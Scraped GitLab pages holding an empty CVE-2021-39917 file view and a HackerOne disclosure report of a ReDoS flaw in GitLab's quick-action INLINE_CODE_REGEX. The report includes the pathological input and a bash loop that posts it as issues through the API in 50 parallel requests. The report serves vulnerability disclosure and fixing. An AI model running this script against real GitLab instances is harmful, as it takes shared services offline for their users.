=== Content from gitlab.com_8282c4ae_20250114_213735.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

* [cves](/gitlab-org/cves/-/tree/master)
* [2021](/gitlab-org/cves/-/tree/master/2021)
* [**CVE-2021-39917.json**](/gitlab-org/cves/-/blob/master/2021/CVE-2021-39917.json)

Find file

[Blame](/gitlab-org/cves/-/blame/master/2021/CVE-2021-39917.json)
[Permalink](/gitlab-org/cves/-/blob/5dbfc725a86e6d942deec9c36b7f06f5b8d912fc/2021/CVE-2021-39917.json "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* [![ GitLab Bot 's avatar](/uploads/-/system/user/avatar/1786152/avatar.png?width=64 " GitLab Bot ")](/gitlab-bot)

  Dec 13, 2021

  [2c72d046](/gitlab-org/cves/-/commit/2c72d04644c1de9d9840576cce49ffbcdb3219ea)
  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/2c72d04644c1de9d9840576cce49ffbcdb3219ea)
  繚
  2c72d046

  [ GitLab Bot ](/gitlab-bot) authored Dec 13, 2021

  2c72d046

  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/2c72d04644c1de9d9840576cce49ffbcdb3219ea)
  [ GitLab Bot ](/gitlab-bot) authored Dec 13, 2021

Loading



=== Content from gitlab.com_5aad50cf_20250114_213736.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# ReDoS via INLINE\_CODE\_REGEX in lib/gitlab/quick\_actions/extractor.rb

**[HackerOne report #1277918](https://hackerone.com/reports/1277918)** by `hashkitten` on 2021-07-26, assigned to [@dcouture](/dcouture "Dominic Couture"):

[Report](#report) | [How To Reproduce](#how-to-reproduce)

## Report

#### Summary

A regex that is used to exclude certain patterns in markdown from Quick Actions has cubic complexity, leading to an application wide DoS.

#### Detail

Gitlab uses regular expressions to exclude certain parts of markdown from being considered a quick action. In [lib/gitlab/quick\_actions/extractor.rb](https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/quick_actions/extractor.rb) the code defines an `INLINE_CODE_REGEX` as follows:

```
INLINE_CODE_REGEX = %r{
  (?<inline_code>
    # Inline code on separate rows:
    # `
    # Anything, including `/cmd arg` which are ignored by this filter
    # `

    `\n*
    .+?
    \n*`
  )
}mix.freeze
```

which is then used as part of a bigger `EXCLUSION_REGEX`

```
EXCLUSION_REGEX = %r{
  #{CODE_REGEX} | #{INLINE_CODE_REGEX} | #{HTML_BLOCK_REGEX} | #{QUOTE_BLOCK_REGEX}
}mix.freeze
```

This regex is matched against the body of issues, comments etc. to exclude certain markdown elements from being considered a candidate for quick actions. However, the `INLINE_CODE_REGEX` has cubic complexity, which leads to an application wide DoS with the pathological input

```
"`"+"\n"*100000+"x".
```

#### Steps to reproduce

The attacker needs an API token and the ability to post issues on at least one project. Run the following bash script, which will attempt to create issues with the body described above:

```
PROTO=https
GITLAB_HOST=your-gitlab-instance
PROJECT_ID=xxxxxx
AUTH_TOKEN=xxxxxx

PAYLOAD=$(ruby -e'print "`"+"\n"*100000+"x"')

for i in {1..50}; do
  curl -X POST \
    "${PROTO}://${GITLAB_HOST}/api/v4/projects/${PROJECT_ID}/issues" \
    -H "Private-Token: ${AUTH_TOKEN}" \
    --data "title=issue_${RANDOM}_${RANDOM}" \
    --data "description=${PAYLOAD}" & done
```

In local testing this caused my Gitlab instance to become unresponsive.

#### Results of GitLab environment info

I reproduced via docker in `gitlab/gitlab-ee:latest`.

```
System information
System:
Proxy:          no
Current User:   git
Using RVM:      no
Ruby Version:   2.7.2p137
Gem Version:    3.1.4
Bundler Version:2.1.4
Rake Version:   13.0.3
Redis Version:  6.0.14
Git Version:    2.32.0
Sidekiq Version:5.2.9
Go Version:     unknown

GitLab information
Version:        14.1.0-ee
Revision:       e4567ef4362
Directory:      /opt/gitlab/embedded/service/gitlab-rails
DB Adapter:     PostgreSQL
DB Version:     12.6
URL:            http://gitlab.example.com
HTTP Clone URL: http://gitlab.example.com/some-group/some-project.git
SSH Clone URL:  git@gitlab.example.com:some-group/some-project.git
Elasticsearch:  no
Geo:            no
Using LDAP:     no
Using Omniauth: yes
Omniauth Providers:

GitLab Shell
Version:        13.19.0
Repository storage paths:
- default:      /var/opt/gitlab/git-data/repositories
GitLab Shell path:              /opt/gitlab/embedded/service/gitlab-shell
Git:            /opt/gitlab/embedded/bin/gi
```

#### Impact

This can be used to render a hosted Gitlab instance inaccessible.

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


